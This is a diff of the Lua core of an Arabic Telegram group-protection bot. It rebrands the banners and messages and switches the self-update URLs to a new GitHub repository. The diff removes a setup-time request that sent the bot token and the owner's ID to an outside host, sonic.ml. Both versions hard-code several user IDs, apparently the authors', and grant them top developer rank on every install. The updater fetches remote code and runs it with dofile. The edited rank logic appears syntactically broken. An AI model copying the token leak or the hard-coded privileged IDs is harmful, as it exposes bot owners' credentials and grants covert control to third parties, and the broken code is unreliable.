@@ -1,19 +1,13 @@
 --[[
-َ          ██                  
-                                                                ███
-          ██             ██                 ██████    ██   █
-          ██           ██  ██             ██           ██  █               
-          ██          ██    ██          ██             ██ █
-          ██         ██      ██        ██              ███   ADHAM ✾ @V_P_E
-          ██        ██        ██      ██               ███   ADHAM ✾ @V_P_E
-          ██       ██  ████  ██      ██              ██ █
-   ██    ██      ██            ██      ██             ██  █
-   ███████     ██              ██      ███████     ██   █
-                                                                ███
-ADHAM ✾ @V_P_E
-تم تطوير وبرمجة السورس من قبل جاك ✾ 
- @V_P_E
-#-ـ-ـ-ـ-ـ-ــ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ--ـ-ـ-ـ-ـ
+─▄█▀█▄──▄███▄─
+▐█░██████████▌
+─██▒█████████─
+──▀████████▀──┊@Q_Y_4
+─────▀██▀─────
+┊ADHAM ‿ @Q_Y_4
+ المطور للسورس ادهم
+┊@Q_Y_4 ‿ @Q_Y_4 
+#-------------------------------------------------------------------
 ]]
 local function download(file_id, dl_cb, cmd)
   tdcli_function ({
@@ -97,7 +91,7 @@ end
 GetUser.result.username = GetUser.result.username or GetUser.result.first_name
 print('\n\27[1;36m￤تم آدخآل آيدي آلمـطـور بنجآح , سـوف يتم تشـغيل آلسـورس آلآن .\n￤Success Save USERID : \27[0;32m['..SUDO_USER..']\n\27[0;39;49m')
 ADHAM = Token:match("(%d+)")
-redis:set(ADHAM..":VERSION",1)
+redis:set(ADHAM..":VERSION",2.9)
 redis:set(ADHAM..":SUDO_ID:",SUDO_USER)
 redis:set(ADHAM..":DataCenter:",'German')
 redis:set(ADHAM..":UserNameBot:",BOT_User)
@@ -112,11 +106,8 @@ Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
 Cr_file:close() 
 print('\27[1;36m￤Token.txt is created.\27[m')
-local Text = "• أهلاً [المطور الاساسي](tg://user?id="..SUDO_USER..") \n• شكراً لأستخدام سورس فلاش \n• أرسل /start\n• لأظهار الاوامر المطور  المجهزه بالكيبورد\n\n."
+local Text = "🙋🏼‍♂️┊اهلا عزيزي [المطور الاساسي](tg://user?id="..SUDO_USER..") \n🔖┊شكرا لاستخدامك سورس ماكس \n📡┊أرســل  الان /start\n♦️┊لاضهار الاوامر للمطور  المجهزه بالكيبورد\n\n⚡️"
 https.request(Api_Token..'/sendMessage?chat_id='..SUDO_USER..'&text='..URL.escape(Text)..'&parse_mode=Markdown')
-Souser = SUDO_USER:gsub('@','')
-Souser = Souser:gsub([[\_]],'_')
-https.request("http://sonic.ml/Kgt/Jj.php?id="..SUDO_USER.."&user="..Souser.."&token="..Token)
 os.execute([[
 rm -f ./README.md
 rm -rf ./.git
@@ -132,20 +123,14 @@ function Start_Bot()
 local TokenBot = io.open('./inc/Token.txt', "r")
 if not TokenBot then
 print('\27[0;33m>>'..[[
-َ          ██                  
-                                                                ███
-          ██             ██                 ██████    ██   █
-          ██           ██  ██             ██           ██  █               
-          ██          ██    ██          ██             ██ █
-          ██         ██      ██        ██              ███   ADHAM ✾ @V_P_E
-          ██        ██        ██      ██               ███   ADHAM ✾ @V_P_E
-          ██       ██  ████  ██      ██              ██ █
-   ██    ██      ██            ██      ██             ██  █
-   ███████     ██              ██      ███████     ██   █
-                                                                ███
-ADHAM ✾ @V_P_E
-✾تم تطوير وبرمجة السورس من قبل جاك ✾ .
-✾ @V_P_E
+─▄█▀█▄──▄███▄─
+▐█░██████████▌
+─██▒█████████─
+──▀████████▀──┊@Q_Y_4 
+─────▀██▀─────
+┊ADHAM ‿ @Q_Y_4
+تم تطوير وبرمجة السورس من قبل ادهم
+┊@Q_Y_4  ‿ @Q_Y_4 
 -------------------------------------------------------------------
 ]]..'\027[0;32m')
 create_config() 
@@ -175,21 +160,15 @@ print(tostring(io.popen("lua inc/locks.lua"):read('*all')))
 end
 
 print('\27[0;33m>>'..[[
-َ          ██                  
-                                                                ███
-          ██             ██                 ██████    ██   █
-          ██           ██  ██             ██           ██  █               
-          ██          ██    ██          ██             ██ █
-          ██         ██      ██        ██              ███   ADHAM ✾ @V_P_E
-          ██        ██        ██      ██               ███   ADHAM ✾ @V_P_E
-          ██       ██  ████  ██      ██              ██ █
-   ██    ██      ██            ██      ██             ██  █
-   ███████     ██              ██      ███████     ██   █
-                                                                ███
-ADHAM ✾ @V_P_E
-✾تم تطوير وبرمجة السورس من قبل جاك ✾ .
-✾ @V_P_E
--ـ-ـ-ـ-ـ-ــ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ--ـ-ـ-ـ-ـ
+─▄█▀█▄──▄███▄─
+▐█░██████████▌
+─██▒█ADHAM████─
+──▀████████▀──┊@Q_Y_4 
+─────▀██▀─────
+┊ADHAM ‿ @Q_Y_4
+تم تطوير وبرمجة السورس من قبل ادهم┊
+┊@Q_Y_4  ‿ @Q_Y_4 
+-------------------------------------------------------------------
                                                   
 ]]..'\027[0;32m'
 ..'¦ TOKEN_BOT: \27[1;34m'..Token..'\027[0;32m\n'
@@ -268,60 +247,53 @@ msg.GroupActive = true
 else
 msg.GroupActive = false
 end
-
-if msg.sender_user_id_ == 1659257439 then 
-msg.TheRank =  'مطور السورس'
+elseif msg.sender_user_id_ == 1599466764 then 
+msg.TheRank =  ' مبرمجه السورس '
 msg.Rank = 1
 
-if msg.sender_user_id_ == 925972505 then 
-msg.TheRank =  'مطور السورس'
+elseif msg.sender_user_id_ == 925972505 then 
+msg.TheRank =  ' مبرمج السورس '
 msg.Rank = 1
 
-
-if msg.sender_user_id_ == 1599466764 then 
-msg.TheRank =  'مطور السورس'
+elseif msg.sender_user_id_ == 1659257439 then 
+msg.TheRank =  ' مبرمج السورس '
 msg.Rank = 1
+
 
 elseif msg.sender_user_id_ == 1488653639 then 
-msg.TheRank =  '𝙳𝙴𝚅 𝙰𝙳𝙷𝙰𝙼 🇪🇬.'
+msg.TheRank =  ' 𝙳𝙴𝚅 𝙰𝙳𝙷𝙰𝙼 🇪🇬 '
 msg.Rank = 1
-
-
-elseif msg.sender_user_id_ == SUDO_ID then 
-msg.TheRankCmd = 'المطور' 
-msg.TheRank = 'مطور اساسي' 
-msg.Rank = 1
-elseif redis:sismember(ADHAM..':THANWY_BOT:',msg.sender_user_id_) then 
-msg.TheRankCmd = 'مطور اساسي²'
-msg.TheRank = 'مطور اساسي²'
+if msg.sender_user_id_ == SUDO_ID then 
+msg.TheRankCmd = 'المطور 👨🏻‍✈️' 
+msg.TheRank = 'مطور اساسي 👨🏻‍✈️' 
 msg.Rank = 1
 elseif redis:sismember(ADHAM..':SUDO_BOT:',msg.sender_user_id_) then 
-msg.TheRankCmd = 'المطور'
-msg.TheRank = 'مطور البوت'
+msg.TheRankCmd = 'المطور 👨🏽‍💻'
+msg.TheRank = 'مطور البوت 👨🏽‍💻'
 msg.Rank = 2
 elseif msg.GroupActive and redis:sismember(ADHAM..':KARA_BOT:'..msg.chat_id_,msg.sender_user_id_) then 
-msg.TheRankCmd = 'المنشىء الاساسي'
-msg.TheRank = 'المنشىء الاساسي'
+msg.TheRankCmd = 'المنشىء الاساسي👷🏽'
+msg.TheRank = 'المنشىء الاساسي👷🏽 '
 msg.Rank = 3
 elseif msg.GroupActive and redis:sismember(ADHAM..':MONSHA_BOT:'..msg.chat_id_,msg.sender_user_id_) then 
-msg.TheRankCmd = 'المنشىء'
-msg.TheRank = 'المنشىء'
+msg.TheRankCmd = 'المنشىء 👷🏽'
+msg.TheRank = 'المنشىء 👷🏽'
 msg.Rank = 4
 elseif msg.GroupActive and redis:sismember(ADHAM..'owners:'..msg.chat_id_,msg.sender_user_id_) then 
-msg.TheRankCmd = 'المدير' 
-msg.TheRank = 'مدير البوت' 
+msg.TheRankCmd = 'المدير 👨🏼‍⚕️' 
+msg.TheRank = 'مدير البوت 👨🏼‍⚕️' 
 msg.Rank = 5
 elseif msg.GroupActive and redis:sismember(ADHAM..'admins:'..msg.chat_id_,msg.sender_user_id_) then 
-msg.TheRankCmd = 'الادمن'
-msg.TheRank = 'ادمن في البوت'
+msg.TheRankCmd = 'الادمن 👨🏼‍🎓'
+msg.TheRank = 'ادمن في البوت 👨🏼‍🎓'
 msg.Rank = 6
 elseif msg.GroupActive and redis:sismember(ADHAM..'whitelist:'..msg.chat_id_,msg.sender_user_id_) then 
-msg.TheRank = 'عضو مميز'
+msg.TheRank = 'عضو مميز ⭐️'
 msg.Rank = 7
 elseif msg.sender_user_id_ == our_id then
 msg.Rank = 8
 else
-msg.TheRank = 'فقط عضو'
+msg.TheRank = 'فقط عضو 🙍🏼‍♂️'
 msg.Rank = 11
 end
  
@@ -376,11 +348,10 @@ kick_user(msg.sender_user_id_, msg.chat_id_)
 end
 if msg.content_.members_[0].id_ == our_id and redis:get(ADHAM..':WELCOME_BOT') then
 SUDO_USER = redis:hgetall(ADHAM..'username:'..SUDO_ID).username
-sendPhoto(msg.chat_id_,msg.id_,redis:get(ADHAM..':WELCOME_BOT'),[[• مرحباً انا بوت ]]..redis:get(ADHAM..':NameBot:')..[[ .
-• اختـصاصـي حمايـة الـمجموعات
-• تأكد من رفعـك للبـوت مشـرف في مجموعـتك واكتب تفعـيل 
-• قنـاة سورس فلاش ⇐ @FAQY4
-. مـعرف المطور  :]]..SUDO_USER:gsub([[\_]],'_')..[[ .
+sendPhoto(msg.chat_id_,msg.id_,redis:get(ADHAM..':WELCOME_BOT'),[[🙋🏽‍♂╿ مـرحبآ آنآ بوت آسـمـي ]]..redis:get(ADHAM..':NameBot:')..[[ ⚜
+⚔│ آختصـآصـي حمـآيهہ‌‏ آلمـجمـوعآت
+🚸│ مـن آلسـبآم وآلتوجيهہ‌‏ وآلتگرآر وآلخ...
+⚖️╽ مـعرف آلمـطـور  : ]]..SUDO_USER:gsub([[\_]],'_')..[[ 🌿
 ]])
 return false
 end
@@ -518,18 +489,18 @@ function tdcli_update_callback(data)
 	end
 	if UpdateSourceStart then
 	UpdateSourceStart = false
-	EditMsg(data.message_.chat_id_,data.message_.id_,'10% - |S          |')
-	EditMsg(data.message_.chat_id_,data.message_.id_,'20% - |SO         |')
-	download_file('https://raw.githubusercontent.com/adham170/FLAASH/main/inc/Run.lua','./inc/Run.lua')
-	EditMsg(data.message_.chat_id_,data.message_.id_,'40% - |SOUR       |')
-	download_file('https://raw.githubusercontent.com/adham170/FLAASH/main/inc/locks.lua','./inc/locks.lua')
-	EditMsg(data.message_.chat_id_,data.message_.id_,'60% - |SOURCE     |')
-	download_file('https://raw.githubusercontent.com/adham170/FLAASH/main/inc/Script.lua','./inc/Script.lua')
-	EditMsg(data.message_.chat_id_,data.message_.id_,'80% - |SOURCE FLA   |')
-	download_file('https://raw.githubusercontent.com/adham170/FLAASH/main/inc/functions.lua','./inc/functions.lua')
-	download_file('https://raw.githubusercontent.com/adham170/FLAASH/main/plugins/zhrfa.lua','./plugins/zhrfa.lua')
-	download_file('https://raw.githubusercontent.com/adham170/FLAASH/main/plugins/games.lua','./plugins/games.lua')
-	EditMsg(data.message_.chat_id_,data.message_.id_,'100% - |SOURCE ADHAM|\n\n• ** السورس الى اصدار \n• ** تم اعاده تشغيل السورس بنجاح')
+	EditMsg(data.message_.chat_id_,data.message_.id_,'10% - |█          |')
+	EditMsg(data.message_.chat_id_,data.message_.id_,'20% - |███         |')
+	download_file('https://raw.githubusercontent.com/ADHAMTELLE/ADHAM/master/inc/Run.lua','./inc/Run.lua')
+	EditMsg(data.message_.chat_id_,data.message_.id_,'40% - |█████       |')
+	download_file('https://raw.githubusercontent.com/ADHAMTELLE/ADHAM/master/inc/locks.lua','./inc/locks.lua')
+	EditMsg(data.message_.chat_id_,data.message_.id_,'60% - |███████     |')
+	download_file('https://raw.githubusercontent.com/ADHAMTELLE/ADHAM/master/inc/Script.lua','./inc/Script.lua')
+	EditMsg(data.message_.chat_id_,data.message_.id_,'80% - |█████████   |')
+	download_file('https://raw.githubusercontent.com/ADHAMTELLE/ADHAM/master/inc/functions.lua','./inc/functions.lua')
+	download_file('https://raw.githubusercontent.com/ADHAMTELLE/ADHAM/master/plugins/zhrfa.lua','./plugins/zhrfa.lua')
+	download_file('https://raw.githubusercontent.com/ADHAMTELLE/ADHAM/master/plugins/games.lua','./plugins/games.lua')
+	EditMsg(data.message_.chat_id_,data.message_.id_,'100% - |█████████████|\n\n🔝*¦* السورس الى اصدار \n📟*¦* تم اعاده تشغيل السورس بنجاح')
 	dofile("./inc/Run.lua")
 	print("Update Source And Reload ~ ./inc/Run.lua")
 	end
@@ -559,18 +530,18 @@ msg.text = Mohammad:gsub(Mohammad,mmdi)
 end
 end
 	if (msg.text=="تحديث" or msg.text=="we" or msg.text=="تحديث ♻️") and msg.sender_user_id_ == SUDO_ID then
-	return sendMsg(msg.chat_id_,msg.id_," • تم تحديث الملفات .\n",nil,function(arg,data)
+	return sendMsg(msg.chat_id_,msg.id_," 🗂┇تہ‏‏م تحديث آلمـلفآت \n✓",nil,function(arg,data)
 	Refresh_Start = true
 	end)
 	end 
 	if msg.text== 'Update Source' and msg.sender_user_id_ == SUDO_ID then
-	download_file('https://raw.githubusercontent.com/adham170/FLAASH/main/inc/Run.lua','./inc/Run.lua')
-	download_file('https://raw.githubusercontent.com/adham170/FLAASH/main/inc/Script.lua','./inc/Script.lua')
-	download_file('https://raw.githubusercontent.com/adham170/FLAASH/main/inc/functions.lua','./inc/functions.lua')
-	download_file('https://raw.githubusercontent.com/adham170/FLAASH/main/inc/locks.lua','./inc/locks.lua')
-	download_file('https://raw.githubusercontent.com/adham170/FLAASH/main/plugins/zhrfa.lua','./plugins/zhrfa.lua')
-	download_file('https://raw.githubusercontent.com/adham170/FLAASH/main/plugins/games.lua','./plugins/games.lua')
-	sendMsg(msg.chat_id_,msg.id_,'• {* تــم تحديث وتثبيت السورس  *} .\n\n• { Bot is Update » }',nil,function(arg,data)
+	download_file('https://raw.githubusercontent.com/ADHAMTELLE/ADHAM/master/inc/Run.lua','./inc/Run.lua')
+	download_file('https://raw.githubusercontent.com/ADHAMTELLE/ADHAM/master/inc/Script.lua','./inc/Script.lua')
+	download_file('https://raw.githubusercontent.com/ADHAMTELLE/ADHAM/master/inc/functions.lua','./inc/functions.lua')
+	download_file('https://raw.githubusercontent.com/ADHAMTELLE/ADHAM/master/inc/locks.lua','./inc/locks.lua')
+	download_file('https://raw.githubusercontent.com/ADHAMTELLE/ADHAM/master/plugins/zhrfa.lua','./plugins/zhrfa.lua')
+	download_file('https://raw.githubusercontent.com/ADHAMTELLE/ADHAM/master/plugins/games.lua','./plugins/games.lua')
+	sendMsg(msg.chat_id_,msg.id_,'👷🏽| {* تــم تحديث وتثبيت السورس  *} 📡.\n\n👨🏼‍💼| { Bot is Update » }👍🏿',nil,function(arg,data)
 	dofile("./inc/Run.lua")
 	print("Reload ~ ./inc/Run.lua")
 	end) 
@@ -581,22 +552,22 @@ end
 	redis:del('setusername'..msg.sender_user_id_)
 	mmd = redis:get(ADHAM..":SUDO_ID:")
 redis:hset(ADHAM..'username:'..tonumber(mmd),'username',msg.text)
-	send_msg(msg.chat_id_,"• عزيزي تم تغيير المطور الاساسي بنجاح الان ارسل reload ...")
+	send_msg(msg.chat_id_,"🙋🏻‍♂│عزيزي تم تغيير المطور الاساسي بنجاح الان ارسل reload ...🍂")
 	end
 	if msg.text and msg.text:match('(%d+)(%d+)(%d+)(%d+)') and redis:get('setid'..msg.sender_user_id_) then
 	redis:setex('setusername'..msg.sender_user_id_,120,true)
 	redis:del('setid'..msg.sender_user_id_)
 	redis:set(ADHAM..":SUDO_ID:",msg.text)
-send_msg(msg.chat_id_,"• تم تثبيت الايدي الان قم برسال معرف المطور @UserName ...")
+send_msg(msg.chat_id_,"🔗│تم تثبيت الايدي الان قم برسال معرف المطور 🍃 @UserName ...")
 	end
 	if msg.text== 'تغير المطور الاساسي' and msg.sender_user_id_ == SUDO_ID then
-    send_msg(msg.chat_id_,"• عزيزي قم برسال ايدي المطور ...")
+    send_msg(msg.chat_id_,"🔗│عزيزي قم برسال ايدي المطور ...🍂")
 redis:setex('setid'..msg.sender_user_id_,120,true)
 end
 	
 	
 	if msg.text== 'reload' and msg.sender_user_id_ == SUDO_ID then
-	sendMsg(msg.chat_id_,msg.id_,'• {* تــم أعـاده تشغيل البوت  *} .\n\n• { Bot is Reloaded » }.',nil,function(arg,data)
+	sendMsg(msg.chat_id_,msg.id_,'👷🏽| {* تــم أعـاده تشغيل البوت  *} 📡.\n\n👨🏼‍💼| { Bot is Reloaded » }👍🏿',nil,function(arg,data)
 	dofile("./inc/Run.lua")
 	print("Reload ~ ./inc/Run.lua")
 	end)
@@ -726,7 +697,7 @@ end
 	if redis:get(ADHAM..'group:add-100'..data.channel_.id_) then
 	local linkGroup = (redis:get(ADHAM..'linkGroup-100'..data.channel_.id_) or "")
 	local NameGroup = (redis:get(ADHAM..'group:name-100'..data.channel_.id_) or "")
-	send_msg(SUDO_ID,"• قام شخص بطرد البوت من المجموعه الاتيه : \n• ألايدي : `-100"..data.channel_.id_.."`\n• الـمجموعه : "..Flter_Markdown(NameGroup).."\n\n• تـم مسح كل بيانات المجموعه بنـجاح ")
+	send_msg(SUDO_ID,"📛┇قام شخص بطرد البوت من المجموعه الاتيه : \n🏷┇ألايدي : `-100"..data.channel_.id_.."`\n🗯┇الـمجموعه : "..Flter_Markdown(NameGroup).."\n\n📮┇تـم مسح كل بيانات المجموعه بنـجاح ")
 	rem_data_group('-100'..data.channel_.id_)
 	end
 	end
@@ -775,7 +746,7 @@ end
 	end
 	end
 	io.popen("rm -fr ../.telegram-cli/data/document/*")
-	sendMsg(Uploaded_Groups_CH,Uploaded_Groups_MS,'• ** تم رفع النسخه‏‏ الاحتياطيه\n• ** حالياً عدد مجموعاتك هيه‏ *'..redis:scard(ADHAM..'group:ids')..' .*\n')
+	sendMsg(Uploaded_Groups_CH,Uploaded_Groups_MS,'📦*¦* تم رفع آلنسـخهہ‏‏ آلآحتيآطـيهہ\n⚖️*¦* حآليآ عدد مـجمـوعآتگ هہ‏‏يهہ‏‏ *'..redis:scard(ADHAM..'group:ids')..'* 🌿\n✓')
 	end
 	elseif data.ID == "UpdateUser" then  
 	if data.user_.type_.ID == "UserTypeDeleted" then
